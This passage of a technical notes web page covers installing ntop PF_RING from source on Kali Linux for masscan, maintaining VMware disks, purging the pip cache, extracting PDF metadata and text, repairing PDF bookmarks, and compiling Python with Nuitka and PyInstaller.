aria-labelledby="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--dependencies-"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Dependencies: </h5> <ul> <li><code>linux-headers</code></li> <li><code>dkms</code></li> <li><code>dh-make</code></li> <li><code>bison</code> - Zero Copy</li> <li><code>libjson-c-dev</code> - Flow Table</li> </ul> <h5 id="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--good-to-have"> <a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--good-to-have" class="anchor-heading" aria-labelledby="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--good-to-have"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Good to have </h5> <ul> <li>Debian package creator: <code>checkinstall</code></li> </ul> <h5 id="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation"> <a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation" class="anchor-heading" aria-labelledby="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Installation </h5> <h6 id="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-flow-table"> <a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-flow-table" class="anchor-heading" aria-labelledby="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-flow-table"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PF_RING Flow Table </h6> <ul> <li><a href="https://www.ntop.org/guides/pf_ring/ft.html">Documentation</a></li> <li>Clone the sources:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/ntop/nDPI</code></pre></div></div></li> <li>Install the library:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>nDPI

./autogen.sh

<span class="c"># Add the version number</span>
checkinstall</code></pre></div></div></li> </ul> <h6 id="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-zero-copy"> <a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-zero-copy" class="anchor-heading" aria-labelledby="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--installation--pf_ring-zero-copy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PF_RING Zero Copy </h6> <ul> <li><a href="https://www.ntop.org/guides/pf_ring/zc.html">Documentation</a></li> <li>Clone the sources:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/ntop/PF_RING</code></pre></div></div></li> <li>Install the kernel module:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>PF_RING/kernel

./configure

make <span class="nt">-f</span> Makefile.dkms deb</code></pre></div></div></li> <li>Install the ZC driver module:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../drivers/intel

./configure

make <span class="nt">-f</span> Makefile.dkms.&lt;driver&gt; deb</code></pre></div></div></li> <li>Install the libpfring library:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../userland/lib

./configure <span class="nt">--enable-ndpi</span>

<span class="c"># Add the version number</span>
<span class="c"># and ndpi as dependency</span>
checkinstall</code></pre></div></div></li> <li>Install the patched libpcap:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../libpcap

<span class="c"># Add --with-{dag,septel,...}</span>
<span class="c"># if you have any of those cards</span>
./configure

<span class="c"># Add the version number</span>
<span class="c"># and libpfring as dependency</span>
checkinstall</code></pre></div></div></li> <li>Install patched tcpdump:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../tcpdump

./configure

<span class="c"># Add the version number</span>
<span class="c"># and libpfring as dependency</span>
checkinstall</code></pre></div></div></li> <li>Install Wireshark <a href="https://www.wireshark.org/docs/wsug_html_chunked/ChPluginFolders.html">plugins</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../wireshark/extcap

<span class="c"># You make have to return to the</span>
<span class="c"># folders where dkms was used and</span>
<span class="c"># issue a make for this to work</span>
make

<span class="c"># Enable select the PF_RING iface</span>
<span class="nb">cp </span>ntopdump /usr/lib/&lt;linux-platform&gt;/wireshark/extcap/

<span class="nb">cd</span> ../plugins

<span class="c"># Enable the PF_RING proto filter</span>
<span class="nb">cp </span>PFRingFlow.lua /usr/lib/&lt;linux-platform&gt;/wireshark/plugins/
<span class="c"># Or ~/.local/lib/wireshark/plugins/</span>
<span class="c"># Or ~/.wireshark/plugins/</span></code></pre></div></div></li> <li>Install specific card modules:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../../modules/&lt;card&gt;

./configure

<span class="c"># Add the version number</span>
checkinstall</code></pre></div></div></li> <li>Install tools and services:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../../../

<span class="c"># Command line tools</span>
<span class="nb">cp </span>package/usr/bin/<span class="k">*</span> /usr/bin/

<span class="nb">cp </span>tools/n2if /usr/bin/

<span class="c"># Systemd services</span>
<span class="nb">cp </span>package/etc/systemd/system/<span class="k">*</span> /etc/systemd/system/</code></pre></div></div></li> </ul> <h5 id="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--post-installation-configuration"> <a href="#tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--post-installation-configuration" class="anchor-heading" aria-labelledby="tricky-configuration--ntop-pf_ring--for-masscan---installing-from-source--kali-linux--post-installation-configuration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Post-Installation Configuration </h5> <ul> <li><a href="https://www.ntop.org/guides/pf_ring/hugepages.html">Enable Hugepages</a></li> <li>Set the correct <a href="http://www.ntop.org/guides/pf_ring/rss.html#rss-receive-side-scaling">RSS</a> values</li> <li><a href="https://www.ntop.org/guides/pf_ring/get_started/packages_installation.html#manual-configuration">Basic Configuration</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Folder skeleton</span>
<span class="nb">mkdir</span> <span class="nt">-p</span> /etc/pf_ring/zc/&lt;driver&gt;

<span class="c"># Set Hugepages values</span>
<span class="nb">echo</span> <span class="s2">"node=0 hugepagenumber=1024"</span> <span class="o">&gt;</span> /etc/pf_ring/hugepages.conf

<span class="c"># Enable RSS</span>
<span class="nb">echo</span> <span class="s2">"RSS=0,0,0,0"</span> <span class="o">&gt;</span> /etc/pf_ring/zc/&lt;driver&gt;/&lt;driver&gt;.conf

<span class="c"># Make the driver usable</span>
<span class="nb">touch</span> /etc/pf_ring/zc/&lt;driver&gt;/&lt;driver&gt;.start

<span class="c"># Set the type of usage per iface</span>
<span class="nb">cat</span> <span class="o">&gt;</span> /etc/pf_ring/interfaces.conf <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh">
MANAGEMENT_INTERFACES="eth0"
CAPTURE_INTERFACES="eth1 eth2"
</span><span class="no">EOF

</span><span class="c"># Or force to load the ZC driver</span>
<span class="nb">touch</span> /etc/pf_ring/forcestart

<span class="c"># You may need to reset the iface</span>
<span class="nb">echo</span> <span class="s2">"ifconfig eth0 192.168.1.1"</span> <span class="o">&gt;</span> /etc/pf_ring/post
<span class="nb">chmod</span> +x /etc/pf_ring/post

<span class="c"># Enable and start the service</span>
systemctl <span class="nb">enable</span> <span class="nt">--now</span> pf_ring

<span class="c"># Check the driver in use</span>
pf_ringcfg <span class="nt">--list-interfaces</span>

<span class="c"># Also check its Polling Mode:</span>
<span class="nb">cat</span> /proc/net/pf_ring/dev/eth0/info</code></pre></div></div></li> <li><a href="https://www.ntop.org/guides/pf_ring/ft.html#ids-acceleration">IDS Acceleration Example</a></li> </ul> <h2 id="tricky-configuration--vmware-vm-maintenance"> <a href="#tricky-configuration--vmware-vm-maintenance" class="anchor-heading" aria-labelledby="tricky-configuration--vmware-vm-maintenance"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> VMWare VM Maintenance </h2> <h3 id="tricky-configuration--vmware-vm-maintenance--defrag"> <a href="#tricky-configuration--vmware-vm-maintenance--defrag" class="anchor-heading" aria-labelledby="tricky-configuration--vmware-vm-maintenance--defrag"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Defrag </h3> <ul> <li>From inside the client machine:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>e4defrag /</code></pre></div></div></li> </ul> <h3 id="tricky-configuration--vmware-vm-maintenance--shrink-disk"> <a href="#tricky-configuration--vmware-vm-maintenance--shrink-disk" class="anchor-heading" aria-labelledby="tricky-configuration--vmware-vm-maintenance--shrink-disk"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Shrink Disk </h3> <ul> <li>Repeat the following twice, starting and powering off the machine (and waiting 10 minutes) in between to allow the VMplayer disk allocator to do its magic</li> <li>From inside the client machine:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vmware-toolbox-cmd disk wipe / <span class="p">;</span> <span class="nb">cat</span> /dev/zero <span class="o">&gt;</span> /wipefile<span class="p">;</span> <span class="nb">sync</span><span class="p">;</span> <span class="nb">rm</span> /wipefile<span class="p">;</span> <span class="nb">sync</span> <span class="p">;</span> vmware-toolbox-cmd disk shrinkonly /</code></pre></div></div></li> <li>Power off the client</li> <li>From the command line (<a href="https://www.howtoforge.com/how-to-shrink-vmware-virtual-disk-files-vmdk">ref</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> &lt;folder-with-vmdk&gt;

<span class="nb">ls</span>

<span class="c"># Defrag</span>
vmware-vdiskmanager <span class="nt">-d</span> &lt;main-vmdk&gt;

<span class="c"># Shrink</span>
vmware-vdiskmanager <span class="nt">-k</span> &lt;main-vmdk&gt;</code></pre></div></div></li> <li>Alternatively from the VMplayer UI: <ul> <li>Select the Hard Drive of the client in the VMplayer dashboard &gt; VM Settings</li> <li>Select Defrag disk (doesn&#8217;t seem to work)</li> <li>Select Compact disk</li> </ul> </li> </ul> <h2 id="tricky-configuration--pip-cache"> <a href="#tricky-configuration--pip-cache" class="anchor-heading" aria-labelledby="tricky-configuration--pip-cache"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Pip Cache </h2> <ul> <li>Purge <code>pip</code> cache and don&#8217;t use it anymore<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Purge all cache</span>
pip cache purge

<span class="c"># Don't use cache</span>
pip config <span class="nb">set </span>global.cache-dir <span class="nb">false</span></code></pre></div></div></li> </ul> <h2 id="tricky-configuration--metadata"> <a href="#tricky-configuration--metadata" class="anchor-heading" aria-labelledby="tricky-configuration--metadata"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Metadata </h2> <h3 id="tricky-configuration--metadata--exiftool"> <a href="#tricky-configuration--metadata--exiftool" class="anchor-heading" aria-labelledby="tricky-configuration--metadata--exiftool"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> exiftool </h3> <ul> <li><a href="https://github.com/exiftool/exiftool">Site</a> - Read/Write metadata from files<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftool &lt;file&gt;</code></pre></div></div></li> <li>Extract interesting meta-fields from PDFs<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># TODO - Try to recover stripped metadata</span>
<span class="k">for </span>f <span class="k">in</span> <span class="k">*</span>.pdf<span class="p">;</span> <span class="k">do </span>exiftool <span class="s2">"</span><span class="nv">$f</span><span class="s2">"</span> | <span class="nb">awk</span> <span class="nt">-vf</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">f</span><span class="p">//\\/\\\\</span><span class="k">}</span><span class="se">\n</span><span class="s2">"</span> <span class="nt">-vd</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">f</span><span class="p">//?/-</span><span class="k">}</span><span class="s2">"</span> <span class="s1">'BEGIN{print d f d}END{print""}{s=$0;gsub("^[^:]+|[][,)( :.]","",s)}s&amp;&amp;/^(MSIP[^:]*)*(Author|Title|Keywords|Creator|Producer|Artist|Credit|Special|By[- ]?Line|(Copy)?[Rr]ights?|Source|For|Name|Owner|Instructions|Originating ?Program|Keywords|Subject|Headline|(Image ?)?Description|City|Country|Company|Comment|Create ?Date|Metadata ?Date|Modify ?Date|Set ?Date|PDF ?Version|GTS ?PDFX ?Version|AI ?Creator ?Version|History ?Parameters|(History ?)?Software ?Agent|Primary ?Platform|Device ?Manufacturer|XMP ?Toolkit|Slices ?Group ?Name|GPS|Make|Camera ?Model ?Name|(Writer|Reader) ?Name|Image ?Description|Sensitivity|Directory|Application|(Manifest ?Reference|Ingredients) ?File ?Path|Profile ?Copyright|Language|Encryption|User ?Access)/&amp;&amp;!x[s]++'</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">tee </span>allpdfs.meta | less
<span class="c"># Use pdftk to easily identify when a PDF</span>
<span class="c"># has Author Passwords instead of looking</span>
<span class="c"># at the Encryption &amp; User Access header</span>

<span class="c"># Mod to hide the headings if no metadata</span>
<span class="c"># for f in *.png *.jpg; do [...] |</span>
<span class="c"># awk [...] 'END{if(p)print""}{s=$0[...]</span>
<span class="c">#  }&amp;&amp;!x[s]++{if(!p++)print d f d;print}';</span>
<span class="c"># done | [...]</span></code></pre></div></div></li> </ul> <h2 id="tricky-configuration--pdf"> <a href="#tricky-configuration--pdf" class="anchor-heading" aria-labelledby="tricky-configuration--pdf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PDF </h2> <h3 id="tricky-configuration--pdf--extract-text"> <a href="#tricky-configuration--pdf--extract-text" class="anchor-heading" aria-labelledby="tricky-configuration--pdf--extract-text"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Extract Text </h3> <h4 id="tricky-configuration--pdf--extract-text--pdftotext--poppler-"> <a href="#tricky-configuration--pdf--extract-text--pdftotext--poppler-" class="anchor-heading" aria-labelledby="tricky-configuration--pdf--extract-text--pdftotext--poppler-"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> pdftotext (poppler) </h4> <ul> <li><a href="https://github.com/freedesktop/poppler">Site</a> - PDF rendering &amp; extractor<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Extract to stdout</span>
pdftotext &lt;file.pdf&gt; -
<span class="c"># By default &lt;file.txt&gt; is created</span>

<span class="c"># Include metadata:</span>
pdftotext <span class="nt">-htmlmeta</span> &lt;file.pdf&gt; - | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s/^&lt;meta .*/&amp;\n/p;/^&lt;pre&gt;/,/^&lt;\/pre&gt;/{//!p}'</span>

<span class="c"># Analyze all PDFs in current dir</span>
<span class="k">for </span>f <span class="k">in</span> <span class="k">*</span>.pdf<span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$f</span><span class="s2">"</span> | <span class="nb">sed</span> <span class="s2">"h;s/./-/gp;H;x"</span><span class="p">;</span> pdftotext <span class="nt">-htmlmeta</span> <span class="s2">"</span><span class="nv">$f</span><span class="s2">"</span> - | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s/&lt;meta .*/&amp;\n/p;/&lt;pre&gt;/,/&lt;\/pre&gt;/{//!p}'</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> <span class="k">done</span> | less</code></pre></div></div></li> </ul> <h3 id="tricky-configuration--pdf--toc---bookmarks"> <a href="#tricky-configuration--pdf--toc---bookmarks" class="anchor-heading" aria-labelledby="tricky-configuration--pdf--toc---bookmarks"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> TOC / Bookmarks </h3> <h4 id="tricky-configuration--pdf--toc---bookmarks--tabula"> <a href="#tricky-configuration--pdf--toc---bookmarks--tabula" class="anchor-heading" aria-labelledby="tricky-configuration--pdf--toc---bookmarks--tabula"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tabula </h4> <ul> <li><a href="https://github.com/tabulapdf/tabula-java">Site</a> - PDF data extractor WebUI-based:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Start web server at 8080</span>
tabula

<span class="c"># Use a different port + options</span>
tabula 9090 &lt;tabula-opts&gt;</code></pre></div></div></li> <li>Open the browser at localhost:&lt;port&gt;</li> <li>Export as <code>JSON (data)</code> to use with <code>jq</code></li> </ul> <h4 id="tricky-configuration--pdf--toc---bookmarks--pdftk"> <a href="#tricky-configuration--pdf--toc---bookmarks--pdftk" class="anchor-heading" aria-labelledby="tricky-configuration--pdf--toc---bookmarks--pdftk"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> pdftk </h4> <ul> <li><a href="https://gitlab.com/pdftk-java/pdftk">Site</a> - PDF data manipulator</li> <li>Export Bookmarks + Metadata:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pdftk &lt;file.pdf&gt; dump_data output &lt;meta-file&gt;</code></pre></div></div></li> <li>Import Bookmarks + Metadata:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pdftk &lt;file.pdf&gt; update_info &lt;meta-file&gt; output &lt;updated.pdf&gt;</code></pre></div></div></li> </ul> <h4 id="tricky-configuration--pdf--toc---bookmarks--pdfminer"> <a href="#tricky-configuration--pdf--toc---bookmarks--pdfminer" class="anchor-heading" aria-labelledby="tricky-configuration--pdf--toc---bookmarks--pdfminer"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> pdfminer </h4> <h5 id="tricky-configuration--pdf--toc---bookmarks--pdfminer--information"> <a href="#tricky-configuration--pdf--toc---bookmarks--pdfminer--information" class="anchor-heading" aria-labelledby="tricky-configuration--pdf--toc---bookmarks--pdfminer--information"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Information </h5> <ul> <li><a href="https://github.com/pdfminer/pdfminer.six">Site</a> - PDF data extractor/analyzer</li> </ul> <h5 id="tricky-configuration--pdf--toc---bookmarks--pdfminer--dumppdf-py"> <a href="#tricky-configuration--pdf--toc---bookmarks--pdfminer--dumppdf-py" class="anchor-heading" aria-labelledby="tricky-configuration--pdf--toc---bookmarks--pdfminer--dumppdf-py"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> dumppdf.py </h5> <ul> <li>Extract the internal PDF structure:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Only TOC/Bookmark table in xml</span>
dumppdf.py <span class="nt">-T</span> &lt;file.pdf&gt; <span class="nt">-o</span> TOC.xml</code></pre></div></div></li> </ul> <h4 id="tricky-configuration--pdf--toc---bookmarks--ghostscript"> <a href="#tricky-configuration--pdf--toc---bookmarks--ghostscript" class="anchor-heading" aria-labelledby="tricky-configuration--pdf--toc---bookmarks--ghostscript"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Ghostscript </h4> <ul> <li><a href="https://www.ghostscript.com/">Site</a> - PostScript + PDF interpreter:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Try compress PDF better</span>
gs <span class="nt">-sDEVICE</span><span class="o">=</span>pdfwrite <span class="nt">-dCompatibilityLevel</span><span class="o">=</span>1.4 <span class="nt">-dPDFSETTINGS</span><span class="o">=</span>/prepress <span class="nt">-dNOPAUSE</span> <span class="nt">-dQUIET</span> <span class="nt">-dBATCH</span> <span class="nt">-sOutputFile</span><span class="o">=</span>&lt;output.pdf&gt; &lt;input.pdf&gt;</code></pre></div></div></li> </ul> <h4 id="tricky-configuration--pdf--toc---bookmarks--import---fix-bookmarks-other-pdf"> <a href="#tricky-configuration--pdf--toc---bookmarks--import---fix-bookmarks-other-pdf" class="anchor-heading" aria-labelledby="tricky-configuration--pdf--toc---bookmarks--import---fix-bookmarks-other-pdf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Import + Fix Bookmarks other PDF </h4> <ul> <li>Use when there are two similar PDFs: <ul> <li>But only one with TOC/Bookmark table</li> <li>Which wants to be added to the other</li> </ul> </li> <li>Extract metadata of both PDFs:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pdftk &lt;file1.pdf&gt; dump_data output &lt;meta-file1&gt;

pdftk &lt;file2.pdf&gt; dump_data output &lt;meta-file2&gt;</code></pre></div></div></li> <li>Manually add the desired metadata from <code>&lt;meta-file1&gt;</code> to <code>&lt;meta-file2&gt;</code> <ul> <li>All <code>Bookmark*</code> data, for example</li> </ul> </li> <li>Using <code>tabula</code>, select the TOC from the PDF pages <b>without</b> the leading section numbers: <ul> <li><b>Do</b> select <code>&quot;Section1 34&quot;</code> (page n 34)</li> <li><b>Don&#8217;t</b> select <code>&quot;1. Section1 34&quot;</code></li> </ul> </li> <li>Export as <code>JSON (data)</code>, file &lt;file.json&gt;</li> <li>Annotate the offset number to the first page in the TOC: <ul> <li>If <code>Section1</code> is in TOC page 1, but actual PDF page is 22, offset = 21</li> </ul> </li> <li>Fix bookmark pages by using the TOC and offset:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">offset</span><span class="o">=</span>21
jq <span class="nt">-r</span> <span class="s1">'.. | .text?'</span> &lt;file.json&gt; | <span class="nb">sed</span> <span class="s1">'/^null$/{d;n};/[0-9]$/!{N;s/\n//};s/\(\. \.\? \?\)\+//'</span> | <span class="k">while </span><span class="nb">read </span>l<span class="p">;</span> <span class="k">do </span><span class="nv">num</span><span class="o">=</span><span class="si">$(</span><span class="nb">grep</span> <span class="nt">-o</span> <span class="s1">'[0-9]\{1,3\}$'</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$l</span><span class="s2">"</span><span class="si">)</span><span class="p">;</span> <span class="nv">sec</span><span class="o">=</span><span class="k">${</span><span class="nv">l</span><span class="p">%</span><span class="k">${</span><span class="nv">num</span><span class="k">}}</span><span class="p">;</span> <span class="nb">sed</span> <span class="nt">-i</span> <span class="s2">"/BookmarkTitle:.*</span><span class="k">${</span><span class="nv">sec</span><span class="p">//\//\\/</span><span class="k">}</span><span class="nv">$/</span><span class="s2">{n;n;s/[0-9]</span><span class="se">\+</span><span class="nv">$/</span><span class="k">$((</span>num <span class="o">+</span> <span class="nv">$offset</span><span class="k">))</span><span class="s2">/}"</span> &lt;meta-file2&gt;<span class="p">;</span> <span class="k">done</span></code></pre></div></div></li> <li>Fix subsections pages not showing in TOC (subsections with more than 2 levels) by calculating offset:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Not 100% reliable offsets</span>
<span class="nb">grep</span> <span class="nt">-B</span> 3 <span class="nt">-A</span> 1 <span class="s1">'BookmarkLevel: [^12]$'</span> &lt;meta-file1&gt; | <span class="nb">awk</span> <span class="s1">'/^BookmarkPageNumber:/{if(bt!=""){n=$2 - pn; print bt, n &lt; 0 ? n % 2 ? 0 : 1 : n; bt=""};pn=$2} /^BookmarkTitle:/{$1="";bt=substr($0,2)}'</span> | <span class="k">while </span><span class="nb">read </span>l<span class="p">;</span> <span class="k">do </span><span class="nv">t</span><span class="o">=</span><span class="k">${</span><span class="nv">l</span><span class="p">% [0-9]</span><span class="k">}</span><span class="p">;</span> <span class="nv">n</span><span class="o">=</span><span class="k">${</span><span class="nv">l</span><span class="p">#</span><span class="k">${</span><span class="nv">t</span><span class="k">}</span><span class="p"> </span><span class="k">}</span><span class="p">;</span> gawk <span class="nt">-i</span> inplace <span class="s2">"/^BookmarkPageNumber/{pn=</span><span class="se">\$</span><span class="s2">2} /^BookmarkTitle:.*</span><span class="k">${</span><span class="nv">t</span><span class="p">//\//\\/</span><span class="k">}</span><span class="nv">$/</span><span class="s2">{print; getline; print; getline; </span><span class="se">\$</span><span class="s2">2=pn + </span><span class="nv">$n</span><span class="s2">} {print}"</span> &lt;meta-file2&gt;<span class="p">;</span> <span class="k">done</span></code></pre></div></div></li> <li>Add new metadata to updated file2.pdf:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pdftk &lt;file2.pdf&gt; update_info &lt;meta-file2&gt; output &lt;updated.pdf&gt;</code></pre></div></div></li> </ul> <h1 id="compilers"> <a href="#compilers" class="anchor-heading" aria-labelledby="compilers"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Compilers </h1> <h2 id="compilers--python"> <a href="#compilers--python" class="anchor-heading" aria-labelledby="compilers--python"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Python </h2> <h3 id="compilers--python--notes"> <a href="#compilers--python--notes" class="anchor-heading" aria-labelledby="compilers--python--notes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Notes </h3> <ul> <li>Try downloading the dependencies with <code>pipenv</code> or <code>venv</code> to avoid conflicts</li> </ul> <h3 id="compilers--python--nuitka"> <a href="#compilers--python--nuitka" class="anchor-heading" aria-labelledby="compilers--python--nuitka"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Nuitka </h3> <ul> <li><a href="https://github.com/Nuitka/Nuitka">Nuitka</a> transforms the intermediary Python code to C and compiles it with a C compiler (which will download):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using python -m is preferred to</span>
<span class="c"># simply calling nuitka</span>
<span class="c"># You may try these as a last resort:</span>
<span class="c"># --follow-stdlib</span>
<span class="c"># --force-dll-dependency-cache-update</span>
<span class="c">#</span>
<span class="c"># Note that follow-stdlib may require</span>
<span class="c"># including all modules in the .py</span>
<span class="c">#  --include-module=site</span>
<span class="c">#</span>
<span class="c"># You may force include pkg/modules:</span>
<span class="c">#  --include-plugin-directory=</span>
<span class="c">#</span>
<span class="c"># You may use a different compiler:</span>
<span class="c">#  --mingw64 | --clang | --msvc=&lt;ver&gt;</span>
<span class="c">#</span>
<span class="c"># You may try linking optimizations:</span>
<span class="c">#  --lto</span>
<span class="c">#</span>
<span class="c"># You may cross arch compile:</span>
<span class="c">#  --python-arch=</span>
<span class="c">#</span>
<span class="c"># In Windows you may specify another</span>
<span class="c"># dir for extraction (like C:) with</span>
<span class="c">#  --windows-onefile-tempdir-spec=</span>
<span class="c">#</span>
<span class="c"># In Windows you may force the stdout</span>
<span class="c"># and stderr to specific files with</span>
<span class="c">#  --windows-force-stdout-spec=</span>
<span class="c">#  --windows-force-stderr-spec=</span>
<span class="c"># &gt; Don't use UPX with nuitka EXEs</span>
python <span class="nt">-m</span> nuitka <span class="nt">--output-dir</span><span class="o">=</span>nuitka-build <span class="nt">--assume-yes-for-downloads</span> <span class="nt">--follow-imports</span> <span class="nt">--standalone</span> <span class="nt">--onefile</span> <span class="nt">--remove-output</span> <span class="nt">--windows-onefile-tempdir</span> <span class="nt">--include-data-file</span><span class="o">=</span>&lt;additional-dir&gt;/<span class="o">=</span>&lt;additional-dir&gt;/ &lt;main-py-file&gt;</code></pre></div></div></li> </ul> <h3 id="compilers--python--pyinstaller"> <a href="#compilers--python--pyinstaller" class="anchor-heading" aria-labelledby="compilers--python--pyinstaller"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PyInstaller </h3> <ul> <li><a href="https://github.com/pyinstaller/pyinstaller">PyInstaller</a> bundles the current python interpreter and the package into an executable:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Try using UPX: --upx-dir</span>
<span class="c"># Try without unicode: -a</span>
<span class="c"># Force import: --hidden-import &lt;pkg&gt;</span>
<span class="c"># Stricter:</span>
<span class="c">#   --win-no-prefer-redirects</span>
<span class="c">#   --win-private-assemblies</span>
python <span class="nt">-m</span> pyinstaller <span class="nt">-c</span> <span class="nt">-F</span> <span class="nt">--clean</span> &lt;main-py-file&gt;</code></pre></div></div></li> </ul> <h3 id="compilers--python--cx_freeze"> <a href="#compilers--python--cx_freeze" class="anchor-heading" aria-labelledby="compilers--python--cx_freeze"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> cx_Freeze </h3> <ul> <li><a href="https://github.com/marcelotduarte/cx_Freeze">cx_Freeze</a> is another alternative but requires Microsoft Visual C++/SDK to create the bundles</li> </ul> </div> </div> </div> </body> </html>
